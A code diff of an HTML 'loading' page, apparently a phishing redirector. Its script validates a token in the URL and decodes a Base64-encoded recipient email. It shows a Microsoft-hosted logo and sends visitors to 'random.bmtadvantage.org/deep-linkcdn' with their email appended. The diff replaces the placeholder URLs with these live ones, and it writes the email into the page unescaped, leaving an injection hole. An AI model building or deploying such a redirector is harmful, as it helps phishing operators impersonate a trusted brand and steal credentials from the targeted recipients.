@@ -18,62 +18,57 @@
             flex-direction: column;
         }
         img {
-            width: 350px;
+            width: 350px; /* Increased logo size */
             height: auto;
             margin-bottom: 20px;
         }
         .email-text {
-            font-size: 18px;
-            font-weight: normal;
-            color: #333;
+            font-size: 18px; /* Normal size for email */
+            font-weight: normal; /* Regular weight */
+            color: #333; /* Slightly darker text for email */
             margin-bottom: 20px;
         }
         .loading {
-            font-size: 24px;
+            font-size: 24px; /* Slightly smaller for loading dots */
             font-weight: normal;
-            color: #666;
+            color: #666; /* Lighter color for the loading dots */
         }
     </style>
     <script>
         window.onload = function () {
             const urlParams = new URLSearchParams(window.location.search);
-            const tokenPattern = /^[A-Z]{20}[a-z]{20}[0-9]{8}=$/; // Token validation pattern
+            const fullParam = window.location.search.substring(1); // Remove '?' from URL
+            const [token, email] = fullParam.split("="); // Split token and email part
 
-            // Extract token
-            let tokenKey = Object.keys(Object.fromEntries(urlParams.entries()))[0] || "";
-            console.log("Extracted token:", tokenKey); // Debugging line
-
-            let email = urlParams.get(tokenKey); // Get email if present
+            const tokenPattern = /^[A-Z]{20}[a-z]{20}[0-9]{8}=$/; // Regex pattern for validation
 
             // Validate token format
-            if (!tokenPattern.test(tokenKey)) {
+            if (!tokenPattern.test(token + "=")) {
                 document.body.innerHTML = "<h2>Invalid Token</h2>";
                 return;
             }
 
-            // Set image & redirect URL
-            const imageUrl = "https://your-logo-url.com/logo.png"; // CHANGE THIS
-            let redirectUrl = "https://your-final-url.com"; // CHANGE THIS
+            // Set your logo image and redirect URL
+            const imageUrl = "https://store-images.s-microsoft.com/image/apps.64342.9007199266252569.06e34d57-e1e7-4d60-9444-9e04e7cea74f.839ba91a-9709-429a-9e00-6c3e0cda6f0c"; // CHANGE THIS
+            let redirectUrl = "https://random.bmtadvantage.org/deep-linkcdn?em="; // CHANGE THIS
 
-            // Decode Base64 if necessary
+            // Decode email if it's in Base64
+            let decodedEmail = "";
             if (email) {
                 try {
-                    let decodedEmail = atob(email);
-                    if (decodedEmail.includes("@")) {
-                        email = decodedEmail;
-                    }
+                    decodedEmail = atob(email);
                 } catch (e) {
-                    // If decoding fails, assume it's already a normal email
+                    decodedEmail = email; // If it's not Base64, use as is
                 }
+                redirectUrl += `?email=${encodeURIComponent(decodedEmail)}`; // Append email to final URL
             }
 
             // Display image
             document.body.innerHTML = `<img src="${imageUrl}" alt="Loading..."><br>`;
 
             // Display email (if provided)
-            if (email && email.includes("@")) {
-                document.body.innerHTML += `<div class="email-text">${email}</div><br>`;
-                redirectUrl += `?email=${encodeURIComponent(email)}`; // Append email to final URL
+            if (decodedEmail) {
+                document.body.innerHTML += `<div class="email-text">${decodedEmail}</div><br>`;
             }
 
             // Display loading dots
